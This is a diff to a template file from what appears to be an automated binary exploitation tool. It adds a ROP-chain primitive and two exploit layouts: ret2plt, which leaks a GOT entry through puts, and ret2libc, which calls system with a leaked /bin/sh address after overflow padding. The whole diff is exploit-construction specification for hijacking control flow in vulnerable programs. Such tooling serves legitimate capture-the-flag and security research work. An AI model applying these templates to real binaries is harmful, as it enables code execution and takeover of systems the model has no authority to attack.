@@ -10,6 +10,16 @@
 #   [dword, ...]                      - the same, 4 bytes (x86)
 #   [shellcode, sh|bash]              - the assembled stub
 #   [shellcode, file]                 - the operator-provided payload file
+#   [chain, REF, REF, ...]            - a ROP chain: one arch-width word
+#                                       per REF, resolved in order
+#
+# chain references:
+#   gadget:TYPE      - the address of that gadget type (facts)
+#   plt_addr:NAME    - the PLT stub address (profiler facts)
+#   got_addr:NAME    - the GOT entry address (profiler facts)
+#   win              - the win_symbol address
+#   leak:NAME        - a leaked_address(name) fact (harvest/banner)
+#   const:N          - the literal N (a syscall number, an offset)
 #
 # resolved at build time from the facts + the measurement; anything the
 # facts cannot supply is a loud BuildError, never a guessed byte.
@@ -38,3 +48,14 @@ banner_leak:
   layout:
     - [padding, measured_offset]
     - [qword, leak:win]
+ret2plt:
+  arch: any
+  layout:
+    - [padding, measured_offset]
+    - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]
+
+ret2libc:
+  arch: any
+  layout:
+    - [padding, measured_offset]
+    - [chain, "gadget:ret_align", "gadget:pop_rdi_ret", "leak:binsh", "leak:system"]
